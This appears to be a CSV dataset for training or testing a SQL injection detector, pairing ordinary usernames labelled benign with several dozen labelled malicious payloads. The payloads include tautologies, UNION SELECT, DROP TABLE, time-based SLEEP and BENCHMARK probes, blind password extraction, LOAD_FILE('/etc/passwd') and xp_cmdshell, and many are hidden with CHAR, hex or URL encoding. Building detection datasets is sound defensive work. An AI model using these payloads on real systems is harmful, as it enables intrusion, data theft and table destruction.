name,is_malicious
zoe79,0
wendycrawford,0
patrick61,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
sarahenglish,0
vargasjose,0
joseph51,0
williamschris,0
mitchell44,0
jessicavelazquez,0
ilewis,0
jsmith,0
sethfox,0
sabrina430x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
rbrooks,0
timothy87,0
nsantos,0
pateltracy,0
jasongarcia,0
hlowe,0
woodsheather,0
justin45,0
jennifermoses,0
georgejennifer,0
davidschaefer' OR 1=1--,1
amber10,0
branchanne,0
uhernandez' OR '1'='1,1
juanmartin,0
holderdustin,0
robertlane,0
luisjackson,0
ariana74,0
mfox,0
jensenmike,0
tanya82,0
alexandercarrie,0
ericabrowning' OR CHAR(49)=CHAR(49)--,1
lkrueger,0
chuff,0
jonathan29,0
amandawilliamson,0
priscillahampton,0
nicolegoodman,0
'%20OR%201=1--,1
melissa92,0
erik40,0
ashley44,0
danielle75,0
harrisdaniel,0
xsingh,0
morrisonjames,0
anthony44,0
martinezkelly,0
qgreen,0
kathryn41,0
fwyatt' OR CHAR(49)=CHAR(49)--,1
johnmahoney,0
adamsfred,0
jamesfrazier,0
jburke,0
sandra40,0
fmoyer,0
simonlori,0
connorhenderson,0
nathanparker,0
belllaura,0
mathew37,0
danielhumphrey,0
steven74,0
bbrown,0
qthomas,0
nweiss,0
zturner,0
ariasreginald0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
nunezclinton,0
timothyanderson,0
ryanhowell,0
christophercook,0
fharris,0
whitelauren,0
lisablackwell,0
jacksonkaren,0
qperkins,0
vmartinez,0
debbie65,0
jonesbrandon,0
meagan86,0
kathyblair,0
kgilbert,0
mali,0
patrickderek,0
bowenjohn,0
danny77,0
bill14,0
galexander,0
kellywilliams,0
alisonmeyer,0
laura75,0
martinezcarlos' OR CHAR(49)=CHAR(49)--,1
tammywilson,0
mary55,0
twilliams,0
kpeterson,0
joselane,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
zdavis,0
kristen48,0
taylor28,0
meganperez,0
ashley28,0
wbowers,0
stephanie30,0
waynewilliams,0
melanie01,0
efuller,0
maria43,0
dean20,0
williamcisneros,0
garzamark,0
alexanderjoseph,0
brittanybarry,0
sarah25%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
julia53,0
michael31,0
erossCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
jason24,0
cory24,0
fthompson,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
walshjeremy,0
nphillips,0
sandra00,0
cervantesmark,0
kathryn64,0
kelleychris,0
samuelmiller,0
taylorcindy,0
priceemily,0
jonesduane,0
nicolebaker0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
jamesgreen,0
conniemorris,0
lauragomez,0
stephenmorton,0
nathaniel40,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
christineglenn,0
burnsmatthew,0
chavezjason,0
brian30,0
tmedina,0
claudiavasquez0x270x7c0x7c0x270x310x270x3d0x270x31,1
terri23,0
kwheeler,0
lawsontanya,0
yolandamalone,0
zwest,0
plewis,0
stephen97,0
johnwelch,0
amyhoward,0
douglaswarner,0
"sierra35' OR BENCHMARK(10000000,MD5(NOW()))--",1
pricedebra,0
nicholas23,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
heather84,0
ffoster,0
phillipsjordan,0
dterrell,0
baileysavannah,0
qgriffin,0
melanie79,0
sonia08,0
'%27%20OR%201=1--,1
zimmermandanielle,0
oblair,0
dhenderson,0
katie49,0
ismith,0
dedwards,0
amy71,0
lisa69,0
matthewwalker,0
amandawyatt,0
jacobsonlaura,0
' OR 0x50=0x50--,1
jacquelineholland,0
christopheraustin%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
zgraham,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
' OR BINARY 'a'='a'--,1
dcarpenter,0
nfinley,0
tommy58,0
contrerasthomas'||'1'='1,1
nicole12,0
rmorris,0
hayesemily,0
erica26,0
amyers,0
randy07,0
cburns,0
mlambert,0
ehernandez'%27%20OR%201=1--,1
ashley39,0
CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
raytonya%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
eric77,0
okline,0
jason53,0
ryan50,0
joseph33,0
owoods,0
'/**/OR/**/'1'='1,1
danielcarroll,0
phillipsgrant,0
iellison,0
mannmartin,0
wileychristopher,0
frederickbeck,0
ruizteresa,0
'/**/OR/**/'1'='1,1
rlopez,0
ssanchez,0
joelrichardson'/**/OR/**/'1'='1,1
stephenmartinez,0
pgomez,0
harold99,0
nicole93,0
bradshawleslie,0
lawrencerobert,0
kristenreid,0
amandalee,0
cowens,0
joannemiller,0
rowejessica,0
hbullock,0
jessica55,0
xgray,0
stephen94,0
rwatkins,0
bholt,0
zwillis,0
thompsonjeremy,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
seanholloway,0
chavezchase'; EXEC xp_cmdshell('dir')--,1
roy30,0
hamiltondonald,0
douglas06,0
gabrielacarey,0
jwilliams,0
keithdennis,0
joseph07,0
patrick05,0
frazierjanice,0
vmosley,0
garciashelby,0
0x270x7c0x7c0x270x310x270x3d0x270x31,1
belindagarcia,0
sharon81,0
duncanwillie,0
savannah46,0
clintontaylor,0
lacey15,0
' UNION SELECT * FROM users--,1
kyle75,0
ashlee00,0
edwardsjoseph,0
kimberly42,0
'/**/OR/**/'1'='1,1
rebecca42,0
msmith,0
xrivera,0
yorkjames,0
vickie14,0
daniel33,0
timstrong,0
jaclyn22,0
russelllisa,0
boltonnancy,0
cgalloway,0
williamsmegan,0
ysharp,0
wilsonmichael,0
xmurphy,0
spatton,0
nunezcynthia,0
charlesmclaughlin,0
timothy64,0
smitherica,0
solomongregory,0
christophergarcia,0
mchan,0
brewerjames,0
chris71,0
david66,0
bridgetgolden,0
mckenzie31CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
isaiah04,0
hughesbrandon,0
isaiahhicks,0
zburkeCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
' OR '1'='1,1
jameshall,0
zflores,0
sdaniel,0
kimberly13,0
michelle51,0
wgutierrez,0
thomasmarshall,0
cking,0
montgomerykimberly,0
josephhernandez,0
lindsaycrawford,0
rachel80,0
patriciatucker%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
faulknerlacey,0
coopertina,0
sara18,0
%27 %4f%52 %31%3d%31--,1
ibradford,0
abigailbryant,0
xavierjones,0
caldwellbradley,0
masseymichelle,0
anna42,0
zking,0
lisa77,0
margaretbutler,0
igarza,0
michelle26,0
meganeaton,0
john94,0
jennifer70,0
turnerchristopher,0
kristenweiss,0
mendozaronald,0
xmccullough,0
thomaswood,0
paulanorton,0
stanleyphilip,0
jessehoward,0
michaelcooke,0
bcarter,0
steven11,0
jamesdavis,0
carlthomas,0
tonifrederick,0
zmartinez,0
gilbertlaura,0
amandabaldwin,0
raytamara,0
brandonnorman,0
rlester,0
catherinefisher,0
tstark'%27%20OR%201=1--,1
smithnicole,0
joseph74,0
walkersteven,0
elizabethmunoz,0
cruzdebbie,0
courtney25,0
tmoore,0
christopherjohnston,0
amandadennis,0
johnsonnicholas,0
pnelson%27%7c%7c%27%31%27%3d%27%31,1
0x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
ejohnson,0
sean85,0
ufields0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
umorris,0
ttaylor,0
jacob65,0
daygabriela' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
brucebarbara,0
kimberly62,0
vtorres,0
omassey,0
gabrielchambers,0
' OR 1=1--,1
0x270x200x4f0x520x200x420x490x4e0x410x520x590x200x270x610x270x3d0x270x610x270x2d0x2d,1
michaelhudson,0
vpalmer,0
christensenjennifer,0
john39,0
holly11,0
michelerivera,0
hartmichael,0
nrodriguez,0
rebecca26,0
sherryhernandez,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
pturner,0
stevensonshannon,0
kaitlyn85,0
%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
evanpeterson,0
fletcherjamie' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
tyler23,0
bboyd,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
jesusbrown,0
cgibbs,0
peckandrew,0
michael85,0
jonathon80,0
carla14,0
owenstina,0
"sanchezsean' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
dgeorge,0
CHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
jamespearson,0
evelynwilliams,0
cowanashley'||'1'='1,1
carolynbrownCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
jimenezjennifer,0
paullong' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
dorothy04,0
bchavez,0
gwood,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
nicoledelgado,0
gabrielwilson,0
williamatkins,0
cole03,0
danielpayne,0
dgarcia,0
hopkinsvictor,0
kelly58,0
woodchristina,0
taylorbenjamin,0
awilliams,0
karina39,0
munozchad,0
tashaswanson,0
johnayers,0
lancebrown,0
amandabennett,0
andersonsheryl,0
laustin' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
rlee,0
toddknapp' OR 1=1--,1
cnewton,0
foconnell,0
michaelcoleman,0
lawrenceamanda,0
fwhite,0
richardking,0
bcraig,0
perezpatricia,0
biancamorgan,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
dwilliamson,0
matthewrogers,0
' OR CHAR(49)=CHAR(49)--,1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
miguel09,0
michellepeterson,0
stevenswilliam,0
